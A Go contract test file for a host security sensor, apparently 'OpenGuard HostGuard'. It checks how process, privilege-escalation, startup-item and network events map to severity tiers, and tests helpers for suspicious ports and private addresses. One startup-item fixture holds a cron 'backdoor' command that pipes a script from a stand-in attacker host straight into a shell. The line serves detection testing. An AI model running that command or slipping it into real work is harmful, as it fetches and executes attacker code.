// Package contract contains contract tests for OpenGuard v5 HostGuard sensor.
package contract_test

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	common "github.com/DiniMuhd7/openguard/adapters/hostguard/common"
)

// TestHostEventToUnifiedEvent verifies that HostEvent.ToUnifiedEvent()
// produces a JSON payload with all required UnifiedEvent schema fields.
func TestHostEventToUnifiedEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType: "process_anomaly",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:        1234,
			PPID:       1,
			Name:       "suspicious",
			ExePath:    "/tmp/suspicious",
			CmdLine:    "/tmp/suspicious --evil",
			Username:   "testuser",
			CPUPercent: 95.0,
			MemoryMB:   3000.0,
			Status:     "running",
		},
		Indicators: []string{"suspicious_path", "resource_spike"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal unified event: %v", err)
	}

	// Verify all required fields are present.
	required := []string{
		"event_id", "timestamp", "source", "domain", "severity",
		"risk_score", "tier", "actor", "target", "human_approved", "audit_hash",
	}
	for _, field := range required {
		if _, ok := result[field]; !ok {
			t.Errorf("missing required field: %s", field)
		}
	}

	// Verify field values.
	if result["domain"] != "host" {
		t.Errorf("expected domain=host, got %v", result["domain"])
	}
	if result["human_approved"] != false {
		t.Errorf("expected human_approved=false, got %v", result["human_approved"])
	}
	if result["audit_hash"] == "" {
		t.Error("expected non-empty audit_hash")
	}
	if result["severity"] != "medium" {
		t.Errorf("expected severity=medium for process_anomaly, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for process_anomaly, got %v", result["tier"])
	}

	// Verify source object.
	source, ok := result["source"].(map[string]interface{})
	if !ok {
		t.Fatal("source is not an object")
	}
	if source["type"] != "host" {
		t.Errorf("expected source.type=host, got %v", source["type"])
	}
	if source["adapter"] != "hostguard" {
		t.Errorf("expected source.adapter=hostguard, got %v", source["adapter"])
	}

	// Verify event_id is UUID format.
	eventID, _ := result["event_id"].(string)
	if len(eventID) != 36 || strings.Count(eventID, "-") != 4 {
		t.Errorf("event_id does not look like a UUID: %s", eventID)
	}
}

// TestPublisherInterface verifies that Publisher implements the expected interface
// by checking it has the Publish and Close methods.
func TestPublisherInterface(t *testing.T) {
	// We cannot construct a real Publisher without NATS; we verify the type has the
	// right method signatures by attempting a compile-time assertion via a nil pointer.
	type publisherInterface interface {
		Close()
	}
	var _ publisherInterface = (*common.Publisher)(nil)
}

// TestSuspiciousPathDetection verifies suspicious path indicators are correctly set
// when an event references a known suspicious path.
func TestSuspiciousPathDetection(t *testing.T) {
	event := &common.HostEvent{
		EventType: "process_anomaly",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:     5678,
			Name:    "malware",
			ExePath: "/tmp/malware",
		},
		Indicators: []string{"suspicious_path"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	indicators, ok := result["indicators"].([]interface{})
	if !ok {
		t.Fatal("indicators is not a list")
	}
	found := false
	for _, ind := range indicators {
		if ind == "suspicious_path" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected 'suspicious_path' in indicators, got %v", indicators)
	}
}

// TestPrivilegeEscalationIndicators verifies privilege escalation indicators
// are preserved in the UnifiedEvent output.
func TestPrivilegeEscalationIndicators(t *testing.T) {
	event := &common.HostEvent{
		EventType: "privilege_escalation",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:  9999,
			Name: "sudo",
		},
		Indicators: []string{"sudo_invocation", "privilege_escalation"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	// For privilege_escalation event type, we expect high severity.
	if result["severity"] != "high" {
		t.Errorf("expected severity=high for privilege_escalation, got %v", result["severity"])
	}
	if result["tier"] != "T3" {
		t.Errorf("expected tier=T3 for privilege_escalation, got %v", result["tier"])
	}

	indicators, ok := result["indicators"].([]interface{})
	if !ok {
		t.Fatal("indicators is not a list")
	}
	indMap := make(map[string]bool)
	for _, ind := range indicators {
		if s, ok := ind.(string); ok {
			indMap[s] = true
		}
	}
	for _, expected := range []string{"sudo_invocation", "privilege_escalation"} {
		if !indMap[expected] {
			t.Errorf("expected indicator %q not found in %v", expected, indicators)
		}
	}
}

// TestSensorConfigDefaults verifies that DefaultConfig returns sensible defaults.
func TestSensorConfigDefaults(t *testing.T) {
	cfg := common.DefaultConfig()
	if cfg.RawEventTopic != "openguard.hostguard.raw" {
		t.Errorf("expected default topic, got %s", cfg.RawEventTopic)
	}
	if cfg.PollInterval == 0 {
		t.Error("expected non-zero PollInterval")
	}
	if cfg.AnomalyThresholds.CPUPercentHigh != 90.0 {
		t.Errorf("expected CPUPercentHigh=90.0, got %f", cfg.AnomalyThresholds.CPUPercentHigh)
	}
	if cfg.AnomalyThresholds.MemoryMBHigh != 2048.0 {
		t.Errorf("expected MemoryMBHigh=2048.0, got %f", cfg.AnomalyThresholds.MemoryMBHigh)
	}
	if cfg.AnomalyThresholds.NewProcessBurst != 20 {
		t.Errorf("expected NewProcessBurst=20, got %d", cfg.AnomalyThresholds.NewProcessBurst)
	}
}

// TestStartupItemUnifiedEvent verifies startup item events produce correct UnifiedEvent fields.
func TestStartupItemUnifiedEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType: "startup_item_added",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		StartupItem: &common.StartupItem{
			ID:      "test-cron-1",
			Name:    "backdoor",
			Type:    "cron",
			Command: "curl http://evil.com/payload.sh | sh",
			Source:  "/etc/cron.d/backdoor",
			Enabled: true,
		},
		Indicators: []string{"curl_pipe_sh"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "high" {
		t.Errorf("expected severity=high for startup_item_added, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for startup_item_added, got %v", result["tier"])
	}
}

// TestNetworkConnectionToUnifiedEvent verifies NetworkConnection events
// produce valid UnifiedEvent JSON with all required fields.
func TestNetworkConnectionToUnifiedEvent(t *testing.T) {
event := &common.HostEvent{
EventType: "connection_established",
Platform:  "linux",
Hostname:  "test-host",
Timestamp: time.Now(),
Process: &common.ProcessInfo{
PID:  1234,
Name: "curl",
},
Indicators: []string{},
RawData: map[string]interface{}{
"protocol":    "tcp",
"local_addr":  "192.168.1.5",
"local_port":  uint16(54321),
"remote_addr": "1.2.3.4",
"remote_port": uint16(80),
"state":       "ESTABLISHED",
"direction":   "outbound",
},
}

payload, err := event.ToUnifiedEvent()
if err != nil {
t.Fatalf("ToUnifiedEvent failed: %v", err)
}

var result map[string]interface{}
if err := json.Unmarshal(payload, &result); err != nil {
t.Fatalf("unmarshal unified event: %v", err)
}

required := []string{
"event_id", "timestamp", "source", "domain", "severity",
"risk_score", "tier", "actor", "target", "human_approved", "audit_hash",
}
for _, field := range required {
if _, ok := result[field]; !ok {
t.Errorf("missing required field: %s", field)
}
}

if result["domain"] != "host" {
t.Errorf("expected domain=host, got %v", result["domain"])
}
// connection_established maps to info/T0.
if result["tier"] != "T0" {
t.Errorf("expected tier=T0 for connection_established, got %v", result["tier"])
}
}

// TestSuspiciousPortDetection verifies IsSuspiciousPort helper correctly
// identifies known C2 ports.
func TestSuspiciousPortDetection(t *testing.T) {
// Verify all ports in the suspicious list are detected.
for _, port := range common.SuspiciousRemotePorts {
if !common.IsSuspiciousPort(port) {
t.Errorf("expected port %d to be flagged as suspicious", port)
}
}

normalPorts := []uint16{80, 443, 22, 25, 53, 8080}
for _, port := range normalPorts {
if common.IsSuspiciousPort(port) {
t.Errorf("expected port %d NOT to be flagged as suspicious", port)
}
}
}

// TestPrivateRangeDetection verifies IsPrivateRange correctly identifies
// RFC1918 addresses.
func TestPrivateRangeDetection(t *testing.T) {
privateAddrs := []string{
"10.0.0.1", "10.255.255.255",
"172.16.0.1", "172.31.255.255",
"192.168.0.1", "192.168.255.255",
"127.0.0.1",
}
for _, addr := range privateAddrs {
if !common.IsPrivateRange(addr) {
t.Errorf("expected %s to be in private range", addr)
}
}

publicAddrs := []string{"8.8.8.8", "1.1.1.1", "203.0.113.1"}
for _, addr := range publicAddrs {
if common.IsPrivateRange(addr) {
t.Errorf("expected %s NOT to be in private range", addr)
}
}
}

// TestServiceInfoIndicators verifies Windows service anomaly indicators
// are correctly set for suspicious service configurations.
func TestServiceInfoIndicators(t *testing.T) {
// Verify suspicious_connection event type gets correct severity.
event := &common.HostEvent{
EventType: "suspicious_connection",
Platform:  "windows",
Hostname:  "test-host",
Timestamp: time.Now(),
Process: &common.ProcessInfo{
PID:  5678,
Name: "malware.exe",
},
Indicators: []string{"suspicious_remote_port", "known_malicious_process_network"},
}

payload, err := event.ToUnifiedEvent()
if err != nil {
t.Fatalf("ToUnifiedEvent failed: %v", err)
}

var result map[string]interface{}
if err := json.Unmarshal(payload, &result); err != nil {
t.Fatalf("unmarshal: %v", err)
}

if result["severity"] != "high" {
t.Errorf("expected severity=high for suspicious_connection, got %v", result["severity"])
}
if result["tier"] != "T2" {
t.Errorf("expected tier=T2 for suspicious_connection, got %v", result["tier"])
}

indicators, ok := result["indicators"].([]interface{})
if !ok {
t.Fatal("indicators is not a list")
}
indMap := make(map[string]bool)
for _, ind := range indicators {
if s, ok := ind.(string); ok {
indMap[s] = true
}
}
if !indMap["suspicious_remote_port"] {
t.Error("expected 'suspicious_remote_port' indicator")
}
if !indMap["known_malicious_process_network"] {
t.Error("expected 'known_malicious_process_network' indicator")
}
}

// TestCriticalServiceStopped verifies that stopping a critical service
// emits a T3 event with the correct indicator.
func TestCriticalServiceStopped(t *testing.T) {
event := &common.HostEvent{
EventType: "process_anomaly",
Platform:  "windows",
Hostname:  "test-host",
Timestamp: time.Now(),
Process: &common.ProcessInfo{
PID:  4,
Name: "lsass",
},
Indicators: []string{"critical_service_stopped"},
}

payload, err := event.ToUnifiedEvent()
if err != nil {
t.Fatalf("ToUnifiedEvent failed: %v", err)
}

var result map[string]interface{}
if err := json.Unmarshal(payload, &result); err != nil {
t.Fatalf("unmarshal: %v", err)
}

if result["severity"] != "critical" {
t.Errorf("expected severity=critical for critical_service_stopped, got %v", result["severity"])
}
if result["tier"] != "T3" {
t.Errorf("expected tier=T3 for critical_service_stopped, got %v", result["tier"])
}

indicators, ok := result["indicators"].([]interface{})
if !ok {
t.Fatal("indicators is not a list")
}
found := false
for _, ind := range indicators {
if s, ok := ind.(string); ok && s == "critical_service_stopped" {
found = true
break
}
}
if !found {
t.Error("expected 'critical_service_stopped' in indicators")
}
}

// TestIsLoopback verifies IsLoopback helper correctly identifies loopback addresses.
func TestIsLoopback(t *testing.T) {
loopbacks := []string{"127.0.0.1", "::1", "127.0.0.2"}
for _, addr := range loopbacks {
if !common.IsLoopback(addr) {
t.Errorf("expected %s to be loopback", addr)
}
}

nonLoopbacks := []string{"192.168.1.1", "8.8.8.8", "10.0.0.1"}
for _, addr := range nonLoopbacks {
if common.IsLoopback(addr) {
t.Errorf("expected %s NOT to be loopback", addr)
}
}
}

// TestIPv6PrivateRangeDetection verifies IsPrivateRange correctly identifies
// IPv6 private and link-local addresses.
func TestIPv6PrivateRangeDetection(t *testing.T) {
	privateIPv6Addrs := []string{
		"::1",          // loopback
		"fc00::1",      // ULA (fc00::/7)
		"fd00::1",      // ULA (fd00::/8, inside fc00::/7)
		"fe80::1",      // link-local (fe80::/10)
		"fe80::dead:beef", // link-local
	}
	for _, addr := range privateIPv6Addrs {
		if !common.IsPrivateRange(addr) {
			t.Errorf("expected IPv6 %s to be in private range", addr)
		}
	}

	publicIPv6Addrs := []string{
		"2001:db8::1",    // documentation prefix (not private)
		"2606:4700::1",   // Cloudflare
		"2001:4860:4860::8888", // Google DNS
	}
	for _, addr := range publicIPv6Addrs {
		if common.IsPrivateRange(addr) {
			t.Errorf("expected IPv6 %s NOT to be in private range", addr)
		}
	}
}

// TestIPv6NetworkConnectionToUnifiedEvent verifies IPv6 network connection events
// produce valid UnifiedEvent JSON.
func TestIPv6NetworkConnectionToUnifiedEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType: "connection_established",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:  2345,
			Name: "curl",
		},
		Indicators: []string{},
		RawData: map[string]interface{}{
			"protocol":    "tcp6",
			"local_addr":  "::1",
			"local_port":  uint16(54321),
			"remote_addr": "2001:db8::1",
			"remote_port": uint16(443),
			"state":       "ESTABLISHED",
			"direction":   "outbound",
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal unified event: %v", err)
	}

	required := []string{
		"event_id", "timestamp", "source", "domain", "severity",
		"risk_score", "tier", "actor", "target", "human_approved", "audit_hash",
	}
	for _, field := range required {
		if _, ok := result[field]; !ok {
			t.Errorf("missing required field: %s", field)
		}
	}

	metadata, ok := result["metadata"].(map[string]interface{})
	if !ok {
		t.Fatal("metadata is not an object")
	}
	if metadata["protocol"] != "tcp6" {
		t.Errorf("expected protocol=tcp6, got %v", metadata["protocol"])
	}
}
